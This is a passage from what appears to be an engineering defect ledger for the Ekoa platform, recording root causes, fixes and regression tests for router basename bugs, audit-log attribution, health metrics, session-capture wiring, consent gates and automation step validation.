  (defaulted) basename isn't even a prefix of the served path. Three symptom shapes, one cause.
  BLAST RADIUS: exactly 4 of the 42 featured artifacts omitted `basename` on `BrowserRouter`
  (grepped every scaffold: 33 declare a top-level Router, 29 of those - every `legal-*` +
  `cobrancas` - already derived and passed `basename` correctly). All 4 are now fixed.
  `ecommerce-catalog` and `invoice-manager` are Stage A DEMOTE dispositions
  (`docs/featured-artifacts-ledger.md`) - fixed anyway, on explicit instruction, because the
  operator had not yet approved any demotion and both were live, broken, featured artifacts in
  the meantime; a pending disposition decision is not a reason to ship known-broken apps.
  FIX (all four): mount the router with `basename` derived from `window.location.pathname` at
  render time - the exact pattern every `legal-*` scaffold's `index.jsx` already carries:
  `window.location.pathname.match(/^(\/apps\/[^/]+)/)`, falling back to `/` when unmatched
  (SSR/tests/`file://`). No platform code changed - the serving pipeline, `injectAppContext`, and
  every other scaffold using the convention correctly were already fine; this is a four-file
  scaffold-content fix.
  CLASS GUARD (the more durable half - built per explicit follow-up instruction, not left as a
  recommendation): `api/tests/apps/featured-router-catalog-guard.test.ts`. Deliberately
  BEHAVIORAL, not a source-text pattern match - the actual invariant is "does the built artifact
  render its routed content when served at `/apps/<id>/`", not "does the source look like the
  fix", and a text pattern cannot honestly stand in for that (it would reject the equally-correct
  `window.__EKOA_APP_ID`-based derivation, and it would ACCEPT a dynamic-looking-but-wrong
  derivation - proven below, not asserted). The guard builds each scaffold with the real
  `appBuilder.build()`, serves it under its real `/apps/<id>/` prefix with the real
  `injectAppContext()`, and asks a real (Playwright-launched) browser whether react-router ever
  emitted either of its two "won't render" diagnostics (see the finding's own root-cause
  paragraph above - discovering the second diagnostic mid-build IS the proof the naive
  single-pattern version would have been wrong). A "guard correctness" sub-suite runs the check
  against six synthetic fixtures first: FAILS on no-basename (the original bug), FAILS on a
  hardcoded literal basename, FAILS on a basename that is dynamically COMPUTED but WRONG (the
  fixture that caught the missing second diagnostic - first attempt at this exact case falsely
  PASSED before the fix), PASSES on the shipped `window.location.pathname` derivation, PASSES on
  a deliberately DIFFERENT correct derivation (`window.__EKOA_APP_ID`-based) proving the guard
  does not merely pattern-match this incident's specific fix, and PASSES on a `HashRouter` with no
  basename at all. HashRouter/MemoryRouter DECISION: both pass by construction, not
  special-cased - HashRouter resolves from `window.location.hash`, entirely independent of the
  served path prefix; MemoryRouter never reads the browser URL at all. The guard only builds
  scaffolds that source-declare `BrowserRouter` (a coarse scoping scan, never the pass/fail
  verdict itself) - 33 of 42 today. A "census against the real catalog" test then runs the same
  behavioral check against all 33 real scaffolds and asserts zero failures, with a failure message
  that names the artifact, states the `/apps/<id>/` prefix rule, and shows the one-line fix -
  written for a 2am reader with no context, per the ask. Currently green (0/33 failing).
  KNOWN FRAGILITY, named rather than hidden: the guard's failure detection is coupled to
  react-router's current diagnostic wording (both exact strings, matched by regex) - a
  react-router upgrade that changes either message needs a companion update here. This is the
  honest cost of a behavioral check over library internals; the mitigation is catching both known
  variants instead of the one this defect happened to hit first.
  SUITE_LEDGER.json: deliberately NOT registered there. `scripts/suite-ledger-run.mjs` strict
  count-censuses three categories only - `web/e2e/*.spec.ts`, `api/tests/e2e/*.e2e.mjs` drivers,
  and `web/__tests__` frontend unit files (its own header: "this runner censuses the
  externally-authored estate... `module_tests_146` runs via plain `npm test`, not this runner").
  This is none of those three; it is a new `api/tests/apps/*.test.ts` vitest module test, which
  the ledger's design deliberately does not count-census (`module_tests_146`/
  `contract_tests_from_ruleset` track the historical migration carryover, not an ongoing inventory
  of every current test file). It runs, and is gated, the same way every other
  `api/tests/apps/*.test.ts` file is - `npm test --workspace api`, step 3 of the per-PR CI lane.
  RECOMMENDATION STILL OPEN: a line in the scaffold-authoring guidance under `api/assets/bases/`
  (so the NEXT scaffold is written correctly rather than merely caught by the guard) - not added
  here; that directory is owned by another in-flight workstream and needs sequencing first.
  Tests: the class guard above (7 tests: 6 synthetic-fixture guard-correctness + 1 real-catalog
  census, all green) supersedes an earlier, narrower `featured-router-basename.test.ts` (a static
  source-text pin covering only booking-system + sales-crm, since removed - the behavioral guard's
  real-catalog census covers the same two apps at strictly higher fidelity, so keeping both would
  have meant maintaining two tests of different rigor for one invariant). Evidence for the
  render-level behavior (react-router's own diagnostics before, the full page content after) is a
  set of Playwright screenshots/console transcripts per artifact taken during diagnosis, not
  checked in as test assets - the class guard is the durable regression gate; the visual proof was
  for diagnosing THIS incident, not a permanent fixture.

- **`registo-anon-audit-actor-blank`** (FIXED 2026-08-08, HIGH, empirically confirmed against the
  live dev DB - 175 of 256 `activity_logs` rows failing validation - found chasing the dashboard's
  "Response for GET /api/v1/registo failed contract validation"). The anonymisation-audit write
  (`llm/anonymise/audit.ts`) recorded `userId: actor.userId ?? ''` / `username: ... ?? ''` /
  `orgId: actor.orgId ?? ''`. `registoEntry()` (`services/platform-crud.ts`) maps
  `actor: a.userId`, and the shared `RegistoEntry.actor` is `Id = z.string().min(1)` - so every row
  with a blank `userId` failed `RegistoListResponse` validation for any reader (`web/lib/api/core.ts`
  contract check). Only a super-admin ever saw it (its `readRegisto` query is unscoped `find({})`;
  an org-admin's is `{orgId: actor.orgId}`, which a blank `orgId` never matches), which is why the
  defect went unnoticed until a super-admin opened the dashboard.
  ROOT CAUSE, traced past the obvious `ctx.actor ?? {}` fallback in `anonymise/index.ts` (that
  fallback's own call sites - `runAgent`/`runOneShot`/`completeFast` via `anonContextFor` - already
  stamp a real actor from the required `LlmAttribution.billeeUserId`, so it was live-but-idle
  defensive code, not the volume source): the REAL source is `llm/client.ts`
  `proxyGatewayMessages`/`proxyGatewayCountTokens`, called from `llm/gateway.ts` with
  `billeeOf(principal)` for the STATIC gateway-key principal (`kind: 'apikey'`) - the credential
  EVERY Agent SDK subprocess presents (`credentials.ts` `buildSubprocessEnv`,
  `env.ANTHROPIC_API_KEY = cfg.llm.gatewayApiKey`) when it calls back into this same chokepoint
  over `ANTHROPIC_BASE_URL` for every turn of its own agentic tool loop. That HTTP boundary
  genuinely carries no per-request user identity - the static key is shared by every subprocess
  regardless of which user's run spawned it - so `billeeUserId` is `''`, and a single chat/build
  turn's subprocess makes many such calls (one per tool-loop turn), which is why this dominated the
  ratio: metering already drew this exact distinction (`kind: 'platform'`, `pi-fast-loop`,
  "platform overhead billed to the platform admin") but the anon-audit actor did not.
  The bridge path (`bridge/provider.ts` -> `proxyGatewayMessages(reqBody, pairing.ownerUserId, ...)`)
  was never affected - it always carries a real principal, the pairing owner.
  FIX, three parts. (1) PRIMARY: `proxyGatewayMessages`/`proxyGatewayCountTokens` now omit `actor`
  entirely when `billeeUserId` is empty, instead of stamping empty-string fields - an honest "no
  principal here" rather than a shape that looks like a real-but-blank identity. Every OTHER call
  site already had a real principal to propagate (see above); minting a per-run scoped gateway key
  so the static-key path could carry one too is a materially larger change (key issuance/lookup
  lifecycle) and is out of scope here - reported honestly rather than half-done. (2) BELT:
  `audit.ts`'s default sink now falls back to the `'system'` sentinel - `actor.userId || 'system'`
  (matching the `server.ts:767` content-loader-audit precedent). Deliberately `||`, not `??`:
  `actor.userId` can already BE an empty string (not `undefined`) at the gateway call sites above,
  which `??` would not replace. (3) BONUS (same PR): `routes/registo.ts` forwarded
  `userId`/`type`/`orgId`/`limit`/`offset` but silently dropped `from`/`to`, which
  `RegistoQuery` (`shared/src/registo.ts`) declares and the UI's date filters
  (`web/stores/registo.ts`) send; `readRegisto` had no date filter either. Wired both through
  (`platform-crud.ts` filters `activityLogs` rows by ISO-8601 string comparison against
  `timestamp`).
  (4) MITIGATION (same PR, added after review): the fix makes these rows RENDER instead of
  breaking the page, and `category: 'anonymisation'` already made up >=68% of the WHOLE
  `activity_logs` collection before this fix (the 175 blank rows were ALL of them - every other
  category's `audit()` helper refuses to write without a real actor) - so a super-admin's
  UNSCOPED "all offices" view would now show mostly `'system'` rows drowning out
  human-attributable ones, growing with usage. Every org-scoped view (every org-admin, and a
  super-admin who picks one office) was never affected either way - `orgId` never matches a real
  org for these rows, blank or `'system'`. `readRegisto` now hides `category: 'anonymisation'` by
  default UNLESS an explicit `type` filter or `includeAnonymisation=true` is given
  (`RegistoQuery.includeAnonymisation`, documented on the wire and in the handler) - and this is a
  VISIBLE default, never a silent one: `web/app/(dashboard)/registo/page.tsx` shows a permanent
  notice stating the rows are hidden by default, with a one-click `Switch` to include them
  (`web/stores/registo.ts` `setIncludeAnonymisation`, auto-refetches).
  Tests: `api/tests/contract/registo.test.ts` (new `describe` blocks) drive the REAL audit path -
  `proxyGatewayMessages(body, '')` - and assert the persisted row and the `GET /api/v1/registo`
  response both carry `'system'`, validate against `RegistoEntry`/`RegistoListResponse`, that an
  org-admin never sees the system-attributed row, that `from`/`to` narrow the result set, that the
  mask row is absent by default and present with `includeAnonymisation=true`, and that an explicit
  `type` filter always wins. `api/tests/llm/anonymise-chokepoint.test.ts` adds the matching
  unit-level sentinel case against the real Mongo-backed default sink. Every lookup lands on the
  exact row via its OWN `metadata.correlationId` (never a coarse `{category:'anonymisation'}` /
  `{userId:'system'}` query) - this file's own build-job tests, and other `proxyGatewayMessages`
  calls elsewhere in the suite, write the SAME category through the SAME fire-and-forget path
  (`audit.ts`), and a coarse query caught one such straggler mid-review. All pre-existing
  anonymise/gateway/registo suites still pass unmodified. The web-side toggle/banner has no
  dedicated automated test (this page had zero web-layer test coverage before this change either);
  the filtering logic itself is fully covered server-side.

- **`change-password-escape-control-drill-asserted-forced-on-default`** (DISMISSED - not a product
  defect - 2026-08-07, found by the drill batch fixer on `change-password#escape-control-present`).
  The drill reported the forced-change escape control ("Terminar sessão") as absent. It was absent
  because the run had landed on the OPTIONAL variant of `/change-password`, where the correct escape
  control is "Voltar ao Dashboard" - and it was present. The product code is correct and already
  variant-aware (`web/app/change-password/page.tsx`): `passwordChangeRequired` renders the sign-out
  control in the forced variant and the back-to-dashboard link in the optional one, exactly one of
  which is always on the page. The real fault was in the drill: the `escape-control-present` step
  asserted the forced control on `state: default`, but the default landing is only forced on a fresh
  stack where the seeded admin still owes the first-login change; once that change has been completed
  the default page is the optional variant. FIX: drive that step through the `forced` state (its
  reachPath signs in as an account owing the change) instead of relying on the default landing; the
  optional case stays covered by `back-link-present`. No product change.

- **`health-reported-the-SSE-count-as-bridgeConnections`** (FIXED 2026-08-07, MEDIUM, an
  observability field that lied in both directions - found while pairing a real daemon and not
  believing the number). `/health` answered `bridgeConnections: sseManager.connectionCount`
  (`api/src/server.ts:914`) - the browser SSE client count. So the field read 1 with a dashboard tab
  open and no daemon anywhere, and 0 with a daemon genuinely connected and reporting
  `Estado da ligação: open`. Both directions wrong at once, which is what made it convincing: it
  moved when things happened, just never for the reason the name claimed.
  `bridge/registry.ts:306` already exports `bridgeConnectionCount()` (`live.size`) whose docblock
  names it as THIS FIELD'S source - "reported separately from SSE `connections`" - and nothing
  called it. Fixed by calling it. Verified live end to end: a MacBook Air paired over tailscale
  (`goncalos-macbook-air.local-6ad045e2`), `ekoa-bridge serve` reconnected by itself across an api
  restart, and `/health` went 0 -> 1 with no SSE client attached.
  WHY IT MATTERED HERE beyond a wrong number: this field is the readiness signal for the attended
  ceremony rail (a ceremony REFUSES when no machine is live), so "is a machine connected?" was
  being answered by "is a browser tab open?". Anyone diagnosing a failed ceremony would have been
  reading noise.

- **`the-attended-session-ceremony-was-built-tested-and-unreachable`** (FIXED 2026-08-06, MEDIUM,
  a complete rail with no ignition - found while answering "how else could an agent authenticate to
  a site" rather than by a suite). Everything needed to capture a human-established browser session
  existed and passed tests: `requestAttendedCeremony` (`api/src/bridge/attended.ts`) opens a
  ceremony on a named machine and refuses rather than queueing when it is offline; the bridge's
  `session.push` handler (`api/src/bridge/server.ts:306`) already called `acceptSessionPush`, which
  refuses an unknown requestId, a push from the wrong machine and a mismatched origin; and
  `captureSessionToCofre` (`api/src/cofre/sessions.ts`) sealed the result as a Cofre item of type
  `session` under the same envelope, grants and lock-all as a password, origin-bound and TTL'd.
  `api/src/cofre/session-checkout.ts` even decided how an expired one must be re-established
  (`typist` vs `attended`) and whether the egress matches where it was made.
  NOTHING IN `api/src` CALLED THE FIRST FUNCTION. Only its own test did. So the daemon-to-Cortex
  direction was live while the Cortex-to-daemon direction had no caller, and the only reachable
  surface - `GET`/`POST /api/v1/integrations/:key/session` - answered a hardcoded
  `"Captura de sessão não disponível nesta versão."` for every key. That stub was itself the
  honest half of an earlier finding (the shipped CITIUS asset promised users "O Ekoa captura a
  sessão autenticada (cookies) e guarda-a cifrada" while the route said `available: false`), so the
  product had been truthful about a capability it owned but could not start.
  FIXED by wiring the two existing routes to the existing engine - no new endpoints, no contract
  change (`SessionCaptureStatus` is passthrough and `ConnectSessionResponse` already declared
  `waiting_login`). POST resolves the package's `sessionConnect.loginUrl` as the origin and the
  ACTOR's own live pairing as the machine, then opens the ceremony; GET reports the real state.
  TWO THINGS DELIBERATELY NOT TAKEN FROM THE REQUEST. The machine is resolved from the actor via
  `getConnectionByOwner`, never a caller-supplied `pairingId` - otherwise one user could pop a login
  prompt on another user's screen and bank the resulting session against their own org. The origin
  is the package's declared `loginUrl`, never a client field - that is what makes the session which
  comes back provably the session for the portal we asked about.
  `supported` (a property of the package) and `available` (a property of this moment) are reported
  separately: collapsing them would tell a user with no machine online that the feature does not
  exist, which is the same class of untruth the stub told everyone. `newestUsableSession` skips
  expired and unhealthy rows, so `captured` never describes a session that would fail at checkout.
  BEHAVIOUR CHANGE worth noting: an unknown `:key` on these two routes is now the uniform 404 every
  other `:key` route answers (A2), where the stub returned 200 for any string because it never
  looked the key up. Two contract tests asserted that blind 200 and were rewritten.
  Pinned by 6 cases in `api/tests/contract/f5-ui-endpoints.test.ts`, including the live path (a
  connected machine: the frame goes to the actor's pairing, carries `attended.request` and the
  package's origin, and one ceremony is open) and the refusal path (no machine -> `started: false`,
  never queued). Reverted-and-verified: removing the ignition turns the live case red.
  Session material still never crosses the wire - both responses are status metadata only, asserted.
  STILL OPEN, and it is a product decision rather than a defect: the ceremony is machine-targeted by
  design because it exists for credentials that cannot travel (an OA certificate in a keystore, a
  Cartão de Cidadão in a reader). There is no ATTENDED-ANYWHERE route - a human who merely needs to
  pass an SMS/TOTP prompt, with no local credential, still has to be at the paired machine. A
  one-time-link flow that let them complete such a login on a phone would reuse
  `captureSessionToCofre` unchanged; only the handoff is missing.

- **`ekoa-dev-work-can-live-only-on-a-peer-machine`** (FIXED 2026-08-06, MEDIUM, parity mechanism —
  found by the operator saying "check on dev-madrid we definitely made changes" after the audit
  reported clean). `npm run parity:audit` printed `parity:audit OK - ledger current` while four
  commits sat on the operator's other machine, committed and never pushed: the served-app email
  plane, document extraction, the Cobranças featured artifact, and the featured-fork fix. GitHub's
  `ekoa-dev` main was genuinely unchanged since 2026-08-03, and `gh api` confirmed it — the audit
  was not wrong about `origin/main`, it was wrong about what the question meant. An audit that
  answers confidently and uselessly is worse than one that does not exist, because it is believed.
  FIX: `scripts/dev-parity-audit.mjs` now fetches configured PEER checkouts into
  `refs/remotes/parity-peer-<name>/main` and reports commits a peer holds that origin does not as
  UNPUSHED, with a per-peer baseline so dispositioned work stops being re-reported; an unreachable
  peer warns and is named as NOT audited on the success line. Two honesty bugs surfaced while
  testing the fix and were fixed with it: an EMPTY `EKOA_DEV_PEERS` suppressed the ledger's own
  peer config (looking like "not set"), and the OK line listed unreachable peers as audited.
  Pinned by `api/tests/docs/dev-parity-audit.test.ts` (throwaway git repos, incl. the negative
  cases). Related: the same read found that upstream `c4f7f2c6`'s MESSAGE describes three fixes
  while the commit contains one — the other two are uncommitted in that machine's working tree, so
  a commit subject is not evidence of what landed.

- **`ported-app-content-can-describe-the-wrong-platform`** (FIXED 2026-08-06, MEDIUM, ported
  content — found while verifying the Cobranças featured artifact renders, not by reading the
  diff). The app's Definições page told the user, in bold as an "honest note": *"a plataforma não
  aplica qualquer confirmação adicional aos envios"* — the platform applies no extra confirmation
  to sends. That was TRUE of the platform it was written for. It is FALSE here: a send from a
  served app is a WRITE and passes the C2 consent gate, so the first time a user acted on that
  sentence they would hit `awaiting_consent` having just been told the door did not exist.
  Rewritten to state both approvals (the app's own work-queue approval, and the account owner's
  one-time authorisation in Integrações). A second defect in the same import: the app's
  `dados-omissao.test.mjs` resolved `seed-data.json` one directory too shallow, so it threw ENOENT
  instead of asserting — a dead test upstream as well as here. Path fixed; the invariant it guards
  (the auto-seed source and the fork-seed file are the same content) does hold, and now provably.
  This is `docs/governance.md`'s runtime-truth rule earning its place: ported content carries
  CLAIMS about a platform it was not written for, and the claims are the part that rots silently —
  the code fails loudly, the sentence just misleads.

- **`the-chat-empty-state-forked-a-featured-app-into-a-second-copy`** (FIXED 2026-08-06, MEDIUM,
  web — ported from ekoa-dev `c4f7f2c6`, which found it in the old platform). Clicking a featured
  Starting Point on the chat empty state called `api.artifacts.fork`, so "use this" produced a
  SECOND copy of the app in the user's gallery, identical in name, with no way to tell which one
  their subsequent edits went into. `/artifacts` had already been fixed to open the featured app's
  own chat via `?continue=` (`handleCustomizeFeatured`), so the two surfaces disagreed about what
  the same action meant. FIX: `web/components/chat/chat-stripes.tsx` opens the running featured app
  in a new tab and routes the current tab to `/chat?continue=<featured.id>`; the backend
  materialises a working copy on the first real modification, keeping id, slug and data.
  `web/lib/featured-fork.ts` is deleted (it had exactly one consumer). Regression:
  `web/__tests__/components/chat-stripes-featured.test.tsx`, whose load-bearing assertion is
  NEGATIVE — `fork` is never called — because asserting only the navigation would still pass with a
  fork firing alongside it, which is exactly the shape the bug had. The upstream commit's other
  half (follow-up detection requiring `projectPath`) is NOT-NEEDED here: ekoa-code already keys a
  follow-up on the artifact id alone and never sends a client-side project dir.

- **`the-capability-surface-listed-google-workspace-and-could-never-execute-it`** (FIXED 2026-08-06,
  HIGH, public capability surface — found by driving the Garrison consumer to a REAL connected
  Google account rather than to a fixture). `POST /api/v1/integrations/:key/actions/:name/execute`
  answered `{"success": false, "code": "not_connected"}` for `google-workspace` on an org whose
  OAuth connection was live, enabled and refreshing — `GET /api/v1/platform-integrations/google`
  reported `connected: true` with the account email, and the stored row
  (`platform-<orgId>-google`) carried valid credentials the whole time.
  CAUSE: custody, not connection. `executeIntegrationCapabilityAction` called
  `executeUserIntegrationAction` and, by design, nothing else — that funnel resolves a PER-USER
  `integrationConfigs` row (`findConfigForOwner`) and there is none for a platform package, so it
  returned the coded refusal from `action-executor.ts:298`. The two shipped platform packages keep
  their tokens on an ORG-scoped row only `callPlatformIntegration` can read, and that function was
  wired into the composition root for the automation `integration` step and the trigger pipeline
  and NEVER onto the capability rail. `action-executor.ts:18-19` states the split plainly ("the
  function the automation engine's `integration` step calls for a NON-platform key … OAuth2/
  service_account are platform-only"); the capability route simply had no platform branch.
  So `GET /api/v1/integrations` listed `google-workspace` with all 24 actions, `GET
  /integrations/google-workspace` described them, the write gate correctly refused the mutating
  ones with a resolved destination — and not one of the 24 could ever run. The catalog advertised a
  rail that did not exist. Every existing case in
  `api/tests/integrations/integration-capability.test.ts` used a user-credential package, which is
  why nothing caught it; the contract suite probes admission, not custody.
  FIXED with a `callPlatform` SEAM on `CapabilityContext`, bound once in `server.ts` exactly like
  the existing `runAutomationBackedAction` and `draftAction` seams, and a custody dispatch in
  `executeIntegrationCapabilityAction` keyed on the new exported `isPlatformIntegrationKey`
  (platform-call.ts). The org comes from the verified principal and the acting user is forwarded so
  the platform write gate has an approval to look up.
  THE GATE DID NOT MOVE, which is the only reason the branch is allowed: `callPlatformIntegration`
  enforces its own gate over the same `action-consent.ts` primitives, in the one function every
  platform rail calls, and a mutating platform action with no live approval still answers
  `awaiting_consent` and still cannot be approved with a key (the approval route is `auth: 'user'`).
  A DIRECT import of the caller is refused by the static guard — the branch must go through the
  injected seam or the module regains its own credential path outside the composition root's
  control. With NO seam bound it fails closed rather than falling through to another custody.
  Pinned by three cases in `api/tests/integrations/integration-capability.test.ts` (the seam is
  used with the right tenancy; the static guard; fail-closed with no seam), reverted-and-verified
  red on two of them. VERIFIED LIVE end to end afterwards: `list_files` through the Garrison
  consumer returned 100 real Drive files, and `send_email_simple` still answered 403
  `awaiting_consent` naming `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send`.
  `api/tests/security` + `api/tests/contract` + `api/tests/integrations` are 1750/1750 green.
  RESIDUAL, FOUND AND CLOSED THE SAME DAY: the fix above moved the WRITE to platform custody and
  left the READ behind, so `getIntegrationCapability` still derived `connected` from the per-user
  config row (`config ? config.enabled !== false : def.authType === 'none'`) and reported
  `connected: false` for a live Google account whose actions now executed fine - the UI rendered
  "connected: false - actions will answer not_connected" directly above a successful call. That is
  the same D3 read/write disagreement this module's docblock already complains about, with the read
  the pessimistic one this time. Closed with a `platformConnected` seam bound from `platformStatus`
  (no token spent), pinned by a case asserting the catalog answers from the platform custody.

- **`a-parked-run-asked-a-question-no-external-client-could-read`** (FIXED 2026-08-06, MEDIUM,
  public capability surface / an endpoint whose auth class invites a caller who cannot use it -
  found while driving the Garrison consumer through the public surface end to end). A run that
  halts at `awaiting_consent` is answered with `POST /api/v1/automations/runs/:id/consent`, whose
  descriptor is `auth: 'user-or-key'` (`shared/src/automations.ts`, `consent`) and whose body
  REQUIRES `shape` (`ConsentRequest`, same file). The service refuses any shape other than the one
  the run is actually awaiting - deliberately, and that refusal is itself a security fix already
  recorded here (`consent-approval-scope-mismatch`, plus the "bank an approval for a shape the user
  was never shown" case pinned in `api/tests/automation/service.test.ts`). So the ONLY shape that
  works is the pending one, and the only carrier of it was the SSE `runAwaitingConsent` event
  (`api/src/automation/engine.ts:769`). There is no event stream on the key-reachable surface -
  `docs/openapi/cortex.v1.json` is generated from the `user-or-key` descriptors and contains none.
  `toWireRun` (`api/src/automation/service.ts`) projected `status` and never `consentRequest`.
  Net effect: a gateway key could read `status: "awaiting_consent"`, could not learn what was being
  asked, could not learn the shape, and therefore could not call the endpoint its own auth class
  invited it to call. The run was answerable only from a browser holding a live SSE subscription.
  This is the same gap the OPEN entry `no-wire-event-can-carry-a-pause-reason` names from the event
  side; this is its polling-side half, and unlike that one it is closable without a new event type.
  FIXED by publishing the pending question on the run record: `RunRecord.consentRequest`
  (`shared/src/automations.ts`, new `RunConsentRequest`) carries `{stepIndex, description, shape}`,
  `toWireRun` projects exactly those three, and `docs/openapi/cortex.v1.json` was regenerated
  (`api/scripts/generate-openapi.mjs`) so the drift gate stays green. ADDITIVE, so rule 7 applies:
  a new optional field on a `.passthrough()` schema; no existing response changed.
  THREE fields, not more: `argv` is the raw command line, which the engine shows a human only behind
  an explicit "what exactly will run?" toggle (`automation/types.ts:572`), and `approvalScope` is
  server-written bookkeeping its own type marks as never caller-supplied (`types.ts:586`). Neither
  becomes public as a side effect of making the gate answerable. Publishing the shape gives an
  attacker nothing the refusal above did not already constrain: `resolveConsent` still binds the
  answer to the run's own pending shape, and a caller who cannot read the run cannot read the shape.
  Pinned by `api/tests/automation/service.test.ts` - a case that reaches `awaiting_consent`, asserts
  the three fields (and the ABSENCE of `argv`/`approvalScope`), answers using ONLY the value the
  wire record published, and asserts the field is cleared once the run resumes so a finished run
  never advertises a stale question. Reverted-and-verified: with the projection removed the case
  fails on `expected undefined to match object`. `api/tests/contract` + `api/tests/automation` are
  844/844 green with it.
  NOT CLOSED BY THIS: the integration write gate on a DIRECT
  `POST /integrations/:key/actions/:name/execute` remains unanswerable by a key, and correctly so -
  it returns 403 with the `consentRequest` descriptor inline, but the approval endpoint
  (`POST /api/v1/integrations/:key/actions/:actionName/approval`) is `auth: 'user'` and off the
  key-reachable surface, so the approving human is a human by construction. Verified live against a
  real minted key: `send_email_simple` answers 403 `awaiting_consent` naming the RESOLVED target
  `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send` (no `{{placeholder}}` -
  independent live confirmation that `consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`
  is fixed), and the gate fires BEFORE the not-connected check, so it answers before a credential is
  touched.

- **`automations-create-dropped-every-step-field-it-could-not-carry`** (FIXED 2026-08-06, HIGH,
  public capability surface / contract honesty - the WIDENING half stays OPEN, at the end of this
  entry). `POST /api/v1/automations` and `PATCH /api/v1/automations/:id` are `user-or-key`
  (Capability Contract rule 4), and both stored their `plan.steps[]` through `mapWireStepToEngine`
  (`api/src/automation/service.ts`, was line 69), which built the engine `Step` from `{id,
  description, type}` and DISCARDED every other field on the wire step - while the contract's
  `PlanStep` (`shared/src/automations.ts:22-31`) is `.passthrough()` and therefore advertises the
  opposite. `toWireAutomation` (same file, ~line 74) then projected the stored step back as
  `{stepId, description, tool}`, so a client could not even SEE what had been lost.
  REPRODUCED LIVE against the running stack, with a key: a step
  `{"description":"List Gmail labels","tool":"integration","integrationKey":"google-workspace","integrationAction":"list_labels"}`
  was accepted **HTTP 201** and stored as
  `{"stepId":"step-0-1e98d8","description":"List Gmail labels","tool":"integration"}`; the run then
  died at execution with `integration step step-0-1e98d8 missing integrationKey or
  integrationAction` (`api/src/automation/engine.ts:1379`). The API discarded the fields the client
  had correctly supplied and then blamed the client at run time for their absence. SIX step types
  are in that position, each with its own run-time death: `integration` (integrationKey +
  integrationAction), `navigate` (url, engine.ts:1335), `sub_automation` (subAutomationId,
  engine.ts:1362), `local_command` (commandTemplate.argv,
  `api/src/automation/executors/local-command.ts:76`), `api_call` (apiRequest.method/.url,
  `executors/api-call.ts:155`), `ekoa_action` (ekoaAction.artifactSlug/.capabilityName,
  `executors/ekoa-action.ts:68`). A SECOND defect sat inside the same expression: an unrecognised
  `tool` was coerced to `'browser'` (`VALID_STEP_TYPES.has(s.tool) ? s.tool : 'browser'`), so the
  typo `brwoser` became a running browser step rather than an error.
  FIXED by refusing both at the door rather than storing a step that can only fail later. The
  uncarried parameters are now a named table (`STEP_TYPE_UNCARRIED_PARAMS`, service.ts:93) and the
  types this endpoint CAN express are derived from it, so the two lists cannot drift; a `tool` in the
  table and an unrecognised `tool` each throw `AutomationServiceError('VALIDATION', ...)`, which the
  router already maps onto the 400 `VALIDATION_FAILED` envelope (`routes/automations.ts`
  `sendServiceError` - this is that code's first use). The refusal message names the fields that
  cannot be expressed AND the route that can author them (`POST /api/v1/automations/plan`, then
  `POST /api/v1/automations/{id}/runs`); the claim was verified before it was written, in
  `automation/planner.ts` `normaliseStep` (sets integrationKey/integrationAction/argsTemplate) and
  `service.ts` `planFromGoal`, which persists those engine-native steps verbatim. The mapping is
  hoisted OUT of the `automations.update` callback in `patchAutomation` (service.ts:385) so a refused
  patch leaves the stored plan untouched instead of throwing mid-write, and out of the doc literal in
  `createAutomation` (service.ts:356) so nothing is minted before the refusal. An ABSENT `tool` still
  means `browser` - the contract marks the field optional and the wire view always emits one - so
  this refuses only input that was already guaranteed to fail (rule 7: nothing that worked stopped
  working). Pinned by `api/tests/automation/service.test.ts` (4 cases: create refused + nothing
  persisted, unrecognised tool not coerced, patch refused with the stored plan byte-identical, and
  the expressible types + absent-tool default still mapping) and
  `api/tests/contract/automations.test.ts` (2 cases through the real router: 400 + error envelope +
  the message naming `integrationKey, integrationAction` and `POST /api/v1/automations/plan`, and the
  refused automation absent from the following list). Reverted-and-verified: with the old mapper body
  restored, 5 of the 6 turn red and the compatibility guard stays green.
  **THE WIDENING QUESTION: ANSWERED 2026-08-06, NARROWLY.** `integration` now travels; nothing else
  does. The distinction is kind, not degree: an integration step can only name a package the RUN's
  own org already has, it resolves at execution under the run's principal like every other rail,
  and a mutating action still meets the write gate and returns `awaiting_consent` without a live
  approval - so the worst it expresses is a call the same caller could already make through
  `POST /integrations/:key/actions/:name/execute`. `commandTemplate`, `apiRequest`, `ekoaAction`,
  `subAutomationId` and `declaration` remain unauthorable, and their step types stay in the refusal
  table. `PlanStep` gains `integrationKey` / `integrationAction` / `argsTemplate` (shared/, additive
  under rule 7, OpenAPI + generated client regenerated); the service validates SHAPE only - a
  half-specified step is a 400 naming the missing field - and deliberately does NOT re-check which
  integration or whether the action may run, because the engine and the write gate already own both
  decisions and a second copy would drift. `toWireAutomation` projects the three fields BACK, which
  is the half that matters: returning only `{stepId, description, tool}` is what made the original
  loss invisible. Pinned by 4 new cases (service + contract) and verified LIVE with a real gateway
  key: authored, stored, read back on the wire, run `completed`.
  The historical record of the refusal follows.
  **THE ORIGINAL WIDENING QUESTION, AS IT STOOD.** Whether this endpoint should
  carry the parametrised step fields AT ALL is a security decision for the owner, not a bug fix. Engine
  `Step` (`api/src/automation/types.ts:258+`) also carries `commandTemplate` (a local command),
  `apiRequest` (an arbitrary outbound HTTP call), `ekoaAction`, `subAutomationId` and `declaration`
  (`StepDeclaration`, Cofre E-2 - which governs WHERE a step may run and which credential refs it may
  name). Passing those through from a key-auth surface would let any gateway-key holder author local
  commands and arbitrary HTTP calls: the same write rails `F-2026-08-03-ungated-write-rails` finished
  gating, reached from the authoring side instead. The narrow whitelist is containment, and widening it
  is not a mapper detail. CANDIDATE CLOSE: publish a NARROW per-type authoring shape in `shared/`
  covering `integration` only (integrationKey + integrationAction + argsTemplate, validated against the
  caller's own connected integrations through the existing catalog), and leave
  `local_command`/`api_call`/`ekoa_action`/`declaration` unauthorable on this surface - the two ends of
  that risk scale are not one decision. Related dangling promise to resolve in the same unit: `PlanStep`
  already declares `argv?: string[]`, which is parsed, never read by the mapper, and now sits on a step
  type (`local_command`) this endpoint refuses. Any of that changes `shared/` and the generated OpenAPI
  document, which is why it was not done here (review policy: the shared contract is cross-model-review
  scope).

- **`the-automation-editors-save-sends-steps-the-api-never-reads`** (OPEN 2026-08-06, HIGH, silent
  data loss in the product UI - found while fixing the entry above, NOT fixed here). The editor's
  Guardar calls the store with a TOP-LEVEL `steps`
  (`web/app/(dashboard)/automations/[id]/page.tsx:213` -> `update(current.id, { name, description,
  steps: draftSteps })`), the store forwards it as `api.automations.patch({ id, ...patch })`
